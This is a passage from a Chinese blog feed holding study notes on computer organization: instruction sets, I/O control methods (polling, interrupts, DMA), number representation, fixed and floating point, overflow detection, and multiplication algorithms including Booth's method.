便于处理数组问题</td></tr><tr><td>相对寻址</td><td>有效地址是将程序计数器PC的内容（即当前指令地址）与指令字中的形式地址相加而成，即EA=(PC)+A。</td><td>- A的位数决定操作数的寻址范围<br> - 对于编写浮动程序特别有利，无论程序在主存的哪段区域都能正常运行<br> - 广泛应用于转移指令</td></tr><tr><td>堆栈寻址</td><td>堆栈可以分为硬堆栈和软堆栈两种，前者由多个寄存器实现，后者由指定的存储空间实现。</td><td>- 堆栈的运行方式可以分为先进后出和先进先出两种。<br> - 堆栈寻址本质上也可以视为寄存器间接寻址。</td></tr></tbody></table><h3 id="指令集"><a class="markdownIt-Anchor" href="#指令集"></a> 指令集</h3><p>主要了解两种指令集：</p><ul><li>RISC（Reduced Instruction Set Computer）精简指令集计算机</li><li>CISC（Complex Instruction Set Computer）复杂指令集计算机</li></ul><p>下面的比较图需要牢固记忆：</p><table><thead><tr><th></th><th>RISC</th><th>CISC</th></tr></thead><tbody><tr><td>CPU</td><td>体积小、能耗低、性能功耗比高</td><td>体积大、能耗高、性能功耗比低</td></tr><tr><td>计算效率</td><td>低</td><td>高</td></tr><tr><td>软件</td><td>体积大、指令复杂度高</td><td>体积小、指令复杂度低</td></tr><tr><td>代表性产品</td><td>ARM</td><td>x86</td></tr></tbody></table><p>现在CISC与RISC正在逐步走向融合。</p><p>……</p><p>……</p><p>第四章到此结束！敬请阅读第五部分👍</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/B457C9EC79F0421BB773651E8FFE5F05.jpg" alt="B457C9EC79F0421BB773651E8FFE5F05" /></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成指北 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
            <tag> 指令系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成指北（三）</title>
      <link href="/posts/1da683a19632/"/>
      <url>/posts/1da683a19632/</url>
      
        <content type="html"><![CDATA[<h2 id="第五章-输入输出系统"><a class="markdownIt-Anchor" href="#第五章-输入输出系统"></a> 第五章 输入输出系统</h2><blockquote><p>相对来说不是那么重要的一章，只需理解概念就可</p><p>输入输出系统知道概念，I/O处理机知道干嘛就行。主要要知道三种控制方式：程序查询方式、中断方式、dma方式</p></blockquote><p>CPU除了要和存储器交换信息外，还需要和外部设备进行通信。这一章我们来介绍计算机的输入输出系统。</p><h3 id="io系统发展概况"><a class="markdownIt-Anchor" href="#io系统发展概况"></a> I/O系统发展概况</h3><p>I/O系统发展经历了四个阶段：</p><ol><li>分散连接。早期主机和I/O设备分散直连，I/O的控制由CPU来负责，因此整个I/O期间I/O和CPU需要一直保持联络，由于速率的不对等，因此一个I/O周期中CPU大部分时间处于是停等状态。</li><li>接口模块和DMA阶段。为了提高效率，出现了I/O接口和DMA控制器。I/O设备通过I/O接口连入I/O总线，DMA控制器专门负责I/O的控制，从而解放出CPU，使得CPU在I/O周期间不必停等。CPU和I/O之间是并行的。此方式中I/O的控制均交给DMA控制器来完成（指令交给控制器来负责），但是控制器不具备数据的处理功能（如读数、写数），因此数据的处理功能仍然要走CPU。</li><li>通道。一种简单的处理器，比起DMA多了数据处理功能，使得I/O的控制、数据处理完全从CPU中剥离出来，为CPU减负。一个通道可以连接多个I/O设备，即一条通道供多个I/O设备“行走”。</li><li>I/O处理机。通道技术的升级版，直接采用和主机CPU结构相同的小型CPU来完全负责I/O的控制和数据处理。</li></ol><h3 id="io设备与主机信息传送的控制方式"><a class="markdownIt-Anchor" href="#io设备与主机信息传送的控制方式"></a> I/O设备与主机信息传送的控制方式</h3><p>分为程序查询方式，中断方式，DMA方式三种。</p><h4 id="程序查询方式"><a class="markdownIt-Anchor" href="#程序查询方式"></a> 程序查询方式</h4><p>结构图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617174213371.png" alt="image-20240617174213371" style="zoom:50%;" /><p>数据先到CPU寄存器，再转存到主存当中。这种方式CPU会一直反复查询I/O设备的状态，仿佛在原地踏步，将CPU和I/O设备处于串行的工作状态，因此工作效率不高。</p><h4 id="中断方式"><a class="markdownIt-Anchor" href="#中断方式"></a> 中断方式</h4><p>结构图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617174302937.png" alt="image-20240617174302937" style="zoom:50%;" /><p>执行第K条指令时，如果外部设备准备好，将向CPU提出一个中断请求，此时再开始向CPU传送数据，而CPU无须终止原程序的执行，没有“踏步”现象，提高了工作效率。但是这需要额外增加相应的电路，并在软件中编制中断服务的程序。</p><h4 id="dma方式"><a class="markdownIt-Anchor" href="#dma方式"></a> DMA方式</h4><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617174331688.png" alt="image-20240617174331688" style="zoom:50%;" /><p>虽然用程序中断方式消除了“踏步”现象，但是CPU接到响应请求后，必须停止现行程序而转入中断服务，这也是对CPU资源的消耗。因此，我们采用直接存储器存取/DMA的方式，让I/O设备通过总线直接与主存交换信息，这样就进一步节省了CPU的资源。</p><p>DMA要使用总线，所以有周期挪用。</p><p>DMA发出请求，占用总线存取周期，用于I/O和主存间数据传输。</p><h2 id="第六章-计算机的运算方法"><a class="markdownIt-Anchor" href="#第六章-计算机的运算方法"></a> 第六章 计算机的运算方法</h2><blockquote><p>全程高能，必考且重要且晦涩</p></blockquote><p>我们已经了解了计算机如何与外界进行通信，以及外部的运行原理。现在，让我们把目光看向计算机中最重要也是最精巧的组成部分：中央处理器CPU（Central Process Unit）。CPU主要由四个部分组成：</p><ul><li>ALU，算数逻辑单元。负责执行所有的算术运算和逻辑运算。</li><li>寄存器。一组快速的存储位置，用于临时存储指令、数据和地址等信息。寄存器直接与ALU交互，比主存储器快得多。</li><li>中断系统。允许外部设备或软件中断当前的程序执行流程，以响应紧急事件或需求。</li><li>CU，控制单元。负责解释指令并生成控制信号，以协调CPU内部各部件的操作和其他系统组件。</li></ul><p>本章中，我们着力学习计算机的ALU部分。</p><p>这里主要复习计算机的内部运算和算术逻辑单元的实现，至于基础的机器数表示方法则不过多介绍，可以参考我在数字逻辑是做的笔记：<a href="https://adam8en.github.io/2023/10/07/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E5%B0%8F%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E5%88%B6%E5%9F%BA%E7%A1%80/">数字逻辑小结（一）—— 数制基础 | Adam8en の 8log</a></p><p>这里只简单的介绍原码、反码、补码、移码的概念</p><ul><li>原码：一个二进制数，包括一个符号位和数值位。符号位等于0为正数，等于1为负数。</li><li>反码：正数的反码是它本身，负数的反码是除符号位外全部取反。</li><li>补码：正数的补码是它本身，负数的补码是它的反码末位+1。</li><li>移码：n为整数的位数，[x]<sub>移</sub>=2<sup>n</sup>+x；与补码的区别只有符号位相反。</li></ul><h3 id="数的定点表示"><a class="markdownIt-Anchor" href="#数的定点表示"></a> 数的定点表示</h3><p>在定点机中，定点表示有两种方式：小数定点机和整数定点机。</p><ul><li><p>在小数定点机中，小数点位于数符和数值部分之间，表示纯小数。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617191648087.png" alt="image-20240617191648087" /></p></li><li><p>在整数定点机中，小数点位于数值部分末尾，表示纯整数。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617191700990.png" alt="image-20240617191700990" /></p></li></ul><p>当机器处理的数不是一个纯小数或者纯整数时，必须要乘以一个“比例因子”，不然会产生溢出。</p><h3 id="数的浮点表示"><a class="markdownIt-Anchor" href="#数的浮点表示"></a> 数的浮点表示</h3><p>浮点数的一般表现形式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mi>S</mi><mo>×</mo><msup><mi>r</mi><mi>j</mi></msup></mrow><annotation encoding="application/x-tex">N=S\times r^j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span></span></span></span></span></span></span>。</p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>为尾数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>为阶码，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>为基数；r可以取2、4、6、8、16等（一般取2）。</p><p>比如N=11.0101=1.10101×2<sup>1</sup>=0.110101×2<sup>10</sup>（二进制）。在计算机中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>是小数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>是整数，均可正可负。</p><h4 id="表示形式"><a class="markdownIt-Anchor" href="#表示形式"></a> 表示形式</h4><p>计算机中一般使用如下结构来表示一个浮点数：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617192423991.png" alt="image-20240617192423991" /></p><ul><li>S<sub>f</sub>代表浮点数的符号</li><li>n反映浮点数的精度</li><li>m反映浮点数的表示范围</li><li>j<sub>f</sub>和m共同表示小数点的实际位置</li></ul><h4 id="表示范围"><a class="markdownIt-Anchor" href="#表示范围"></a> 表示范围</h4><p>这个不强求记忆，看看图理解就好了</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617193019750.png" alt="image-20240617193019750" style="zoom:50%;" /><h4 id="规格化形式"><a class="markdownIt-Anchor" href="#规格化形式"></a> 规格化形式</h4><p>规格化数，即要求尾数的最高位为1。</p><p>故N=11.0101的规格化数的表现形式为0.110101×2<sup>10</sup>。</p><p>规格化数中，原码不论正负数第一数位都为1，而补码符号位和第一数位不同。</p><ul><li>左规：尾数左移一位，阶码减 1，直到数符和第一数位不同为止。</li><li>右规：当 尾数溢出（ &gt;1）时，需右规；尾数右移一位，阶码加 1。</li></ul><blockquote><p>例题：将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>+</mo><mfrac><mn>19</mn><mn>128</mn></mfrac><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">+\frac{19}{128}\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord">+</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span></span></span>写成二进制定点数、浮点数及在定点机和浮点机中的机器数形式。其中数值部分均取 10 位，数符取 1 位，浮点数阶码取 5 位（含1位阶符）。</p><p>二进制形式：0.0010011</p><p>定点表示：0.0010011000</p><p>浮点化规格表示：0.1001100000×2<sup>-10</sup></p><p>定点机：[x]<sub>原</sub> = [x]<sub>补</sub> = [x]<sub>反</sub> = 0.0010011000</p><p>浮点机：[x]<sub>原</sub> = 1, 0010;  0. 1001100000</p><p>​[x]<sub>补</sub> = 1, 1110;  0. 1001100000</p><p>​[x]<sub>反</sub> = 1, 1101;  0. 1001100000</p></blockquote><h3 id="定点运算"><a class="markdownIt-Anchor" href="#定点运算"></a> 定点运算</h3><p>重要⚠️！复习提纲上没有涉及浮点数的四则运算，所以这就是Boss了。</p><h4 id="移位运算"><a class="markdownIt-Anchor" href="#移位运算"></a> 移位运算</h4><table border="2" >    <caption>算数移位规则·符号位不变</caption>    <tr ><td>真值</td>        <td>码制</td>        <td>添补代码</td></tr>    <tr ><td>正数</td>        <td>原码、补码、反码</td>        <td>0</td></tr><tr ><td rowspan="4">负数</td><td>原码</td>        <td>0</td></tr><tr ><td rowspan="2">补码</td>        <td>左移 添0</td></tr>    <tr ><td>右移 添1</td></tr>    <tr ><td>反码</td>        <td>1</td></tr></table><p>通过移位来进行加减法运算。</p><p>移位又分算术移位和逻辑移位，算术移位上述表格已经给出规则，适用于有符号数的运算。对于无符号数的运算，通常使用逻辑移位。</p><ul><li>逻辑左移：低位添0，高位移丢</li><li>逻辑右移：高位添0，低位移丢</li></ul><h4 id="加减法运算"><a class="markdownIt-Anchor" href="#加减法运算"></a> 加减法运算</h4><p>补码加减法运算公式有：</p><ol><li><p>加法：</p><ul><li>整数：[A]<sub>补</sub> + [B]<sub>补</sub>= [A+B]<sub>补</sub>（mod 2<sup>n+1</sup>）</li><li>小数：[A]<sub>补</sub> + [B]<sub>补</sub>= [A+B]<sub>补</sub>（mod <sup>2</sup>）</li></ul></li><li><p>减法：</p><p>即加上相反数的加法运算A-B=A+(-B)</p><ul><li>整数：[A – B]<sub>补</sub>= [A+(–B )]<sub>补</sub>= [A]<sub>补</sub> + [ – B]<sub>补</sub>(mod 2<sup>n+1</sup>)</li><li>小数：[A – B]<sub>补</sub>= [A+(–B )]<sub>补</sub>= [A]<sub>补</sub> + [ – B]<sub>补</sub>(mod 2)</li></ul></li></ol><p>即加上两数的补码，连同符号位一起相加，符号位产生的进位自然丢掉。</p><h4 id="溢出判断"><a class="markdownIt-Anchor" href="#溢出判断"></a> 溢出判断</h4><p>溢出有分两种情况：一位符号位的溢出与两位符号位的溢出</p><p>先讨论一位符号位的：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617205017557.png" alt="image-20240617205017557" style="zoom: 80%;" /><p>参加操作的两个数（减法时即为被减数和“求补”以后的减数）符号相同，其结果的符号与原操作数的符号不同时，即为溢出。</p><p>再来看两位符号位的溢出：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617205310191.png" alt="image-20240617205310191" style="zoom:80%;" /><p>即把符号位写两遍，然后进行运算。如果双符号位最终不同，就为溢出。</p><h4 id="乘法运算"><a class="markdownIt-Anchor" href="#乘法运算"></a> 乘法运算</h4><h5 id="原码一位乘"><a class="markdownIt-Anchor" href="#原码一位乘"></a> 原码一位乘</h5><p>观察下图，我们可以总结规律：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617205811311.png" alt="image-20240617205811311" style="zoom:50%;" /><p>概括一下定点原码一位乘的步骤：先在0上加一个被乘数，右移一位；再在部分积上逆序乘数加，同时被乘数继续右移一位。</p><p>乘法运算可用加和移位实现。当n = 4时，加 4 次，移 4 次。由乘数的末位决定被乘数是否与原部分积相加，然后右移1位形成新的部分积，同时乘数右移1位（末位移丢），空出高位存放部分积的低位。然后再将被乘数只与部分积的高位相加。</p><p>如果对象是小数，那么数值部分按以上规则用绝对值相乘，符号位部分单独做异或处理。</p><p>归纳成次序步骤可以总结如下：</p><ol><li>列出竖式，写出被乘数和乘数的数值部分</li><li>首先，初态为0，加上一个被乘数</li><li>得到的和应该和被乘数相等，然后右移一位得到第一个部分积。同时乘数也要右移一位。</li><li>此时，引入乘数，根据乘数的末尾值是否1来判断是否加上一个被乘数。如果为1，则加上一个被乘数；如果为0，则加上0。（这里假设末位为1）</li><li>部分积加上一个乘数，得到一个和。</li><li>将和右移一位得到新的部分积，同时乘数右移一位：低位直接移丢，空出来的高位用来存储部分积右移移丢的低位值。</li><li>重复以上步骤n次，n为被乘数与乘数的长度，最后的积即为部分积拼接上乘数，此时存储乘数的寄存器内存储的应该是被乘数部分积在不断右移中移丢的低位积部分。</li><li>符号位单独异或处理，判断正负。</li></ol><p>需要硬件实现：3个具有移位功能的寄存器，1个全加器。</p><p>以下竖式笔算计算机乘法（13×11=143=10001111）步骤供参考：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617210127927.png" alt="image-20240617210127927" style="zoom:50%;" /><p>拼接被乘数和乘数寄存器内的数值，最后结果为0.10001111，经验证正确。</p><p>原码一位乘的特点是：</p><ul><li>绝对值运算</li><li>用移位的次数判断乘法是否结束</li><li>逻辑移位</li></ul><h5 id="原码两位乘"><a class="markdownIt-Anchor" href="#原码两位乘"></a> 原码两位乘</h5><ul><li>原码乘的含义是：符号位和数值位部分分开运算</li><li>两位乘的含义是：每次用乘数的2位判断原部分积是否加和如何加被乘数</li></ul><p>运算法则如下表所示：</p><table><thead><tr><th>乘数y<sub>n-1</sub>y<sub>n</sub></th><th>新的部分积</th></tr></thead><tbody><tr><td>0 0</td><td>加0，右移两位</td></tr><tr><td>0 1</td><td>加1倍的被乘数，右移两位</td></tr><tr><td>1 0</td><td>加2倍的被乘数，右移两位</td></tr><tr><td>1 1</td><td>加3倍的被乘数，右移两位</td></tr></tbody></table><p>我们知道加1倍的被乘数就是直接算加法，两倍的被乘数就是先把被乘数进行算数左移1位后再与原部分积相加，那么3倍的被乘数怎么算呢？</p><p>答案是通过先减去1倍的被乘数再加上4倍的被乘数，也就是减去一个被乘数后再加上被乘数算数左移2位的值，我们需要留到下次再加，用一个进位标志C，来记录这次没加上的4倍。至于减法，我们选择计算加上其相反数的补码，这样可以方便运算。</p><p>引入进位标志C后，运算规律可以参考下列的表格，更加逻辑化：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618144232292.png" alt="image-20240618144232292" /></p><p>这里给出一个例题，原码二位乘的运算过程可以参考如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618144436770.png" alt="image-20240618144436770" style="zoom:50%;" /><p>要加2x，和的绝对值可能大于2，因此小数点左边取3位，最高位才是真正的符号位。</p><p>注意：在乘数（偶数）前面加两个0/（奇数）前面加一个0，若仍有进位没处理时，可以处理掉，使C重新等于0。这些添加的0非乘数本身数值，因此最后一步不用移位</p><p>其中符号位仍然继续使用异或来判断。</p><p>原码二位乘加快了计算机的远算速度，有以下几个特点：</p><ol><li>绝对值的<strong>补码运算</strong></li><li>用移位的次数判断乘法是否结束</li><li>算术移位</li></ol><p>相比原码一位乘只是多了个补码运算，用于计算减法。</p><p>下表列出了原码一位乘和原码二位乘的比较：</p><table><thead><tr><th></th><th>原码一位乘</th><th>原码两位乘</th></tr></thead><tbody><tr><td>符号位</td><td>x<sub>0</sub>⊕y<sub>0</sub></td><td>x<sub>0</sub>⊕y<sub>0</sub></td></tr><tr><td>操作数</td><td>绝对值</td><td>绝对值的补码</td></tr><tr><td>移位</td><td>逻辑右移</td><td>算数右移</td></tr><tr><td>移位次数</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>n</mi><mn>2</mn></mfrac><mo stretchy="false">(</mo><mi>n</mi><mtext>为偶数</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{n}2(n为偶数)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">偶</span><span class="mord cjk_fallback">数</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>n</mi><mn>2</mn></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">(</mo><mi>n</mi><mtext>为奇数</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{n}2+1(n为奇数)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">奇</span><span class="mord cjk_fallback">数</span><span class="mclose">)</span></span></span></span></td></tr><tr><td>最多加法次数</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>n</mi><mn>2</mn></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">(</mo><mi>n</mi><mtext>为偶数</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{n}2+1(n为偶数)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">偶</span><span class="mord cjk_fallback">数</span><span class="mclose">)</span></span></span></span></td></tr></tbody></table><h5 id="补码一位乘"><a class="markdownIt-Anchor" href="#补码一位乘"></a> 补码一位乘</h5><p>我先给出PPT上的运算方法</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618161452567.png" alt="image-20240618161452567" style="zoom:50%;" /><p>补码一位乘，又称<strong>校正法</strong>。我不知道多少人是和我一样根本看不懂这一页是在讲什么的，但是好歹只是个求补码，我决定还是采用自己的方法去计算，即：除符号位全部取反后末位加1。</p><p>所以这里我们抛开晦涩的教材，自己来总结一下补码一位乘的计算方法，其实大致和原码一位乘的方法相似，特点如下：</p><ol><li>当被乘数符号任意，乘数为正时：运算规则同原码乘，但加和移位的方法要按照补码运算的规则，此时乘积的符号会自然形成而无非单独进行异或运算。</li><li>当被乘数符号任意，乘数为负时：乘数为[y]<sub>补</sub>，去掉符号位当成正数与被乘数进行运算，步骤同1。最后要加上[–x]<sub>补</sub>，进行<strong>校正</strong>。</li><li>运算时可能会出现绝对值大于1的情况，但此时并不是溢出，所以采用双符号位的方式计算。</li></ol><p>这里给出一道例题供参考：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/IMG_20240618_164350.jpg" alt="IMG_20240618_164350" style="zoom: 25%;" /><p>注意，最后加上[–x]<sub>补</sub>进行修正时，不需要再进行移位。</p><h5 id="booth算法"><a class="markdownIt-Anchor" href="#booth算法"></a> Booth算法</h5><p>Booth算法，又称<strong>比较法</strong>。适用于符号任意的被乘数与乘数，具有普适性。由于比较法的补码乘法运算规则不受符号约束，因此控制线路比较简明，在计算机中普遍采用。</p><p>比较法的公式过于抽象，这里就不再赘述，不方便理解。其实本质上还是继续加上[–x]<sub>补</sub>，然后右移一位的迭代过程。每次要不要加[–x]<sub>补</sub>，由y<sub>i+1</sub>和y<sub>i</sub>决定。其运算规律如下表所示：</p><table><thead><tr><th>y<sub>i</sub>y<sub>i+1</sub></th><th>y<sub>i+1</sub> -  y<sub>i</sub></th><th>操作</th></tr></thead><tbody><tr><td>0    0</td><td>0</td><td>右移一位</td></tr><tr><td>0    1</td><td>1</td><td>+[x]<sub>补</sub>，右移一位</td></tr><tr><td>1    0</td><td>-1</td><td>+[–x]<sub>补</sub>，右移一位</td></tr><tr><td>1    1</td><td>0</td><td>右移一位</td></tr></tbody></table><p>记住，比较法的最后一步不移位。</p><p>与校正法相比，比较法的部分积仍然取双符号位。乘数因为符号位参与运算，所以多取一位。</p><p>给出例题参考如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618165410762.png" alt="image-20240618165410762" style="zoom:50%;" /><h5 id="乘法小结"><a class="markdownIt-Anchor" href="#乘法小结"></a> 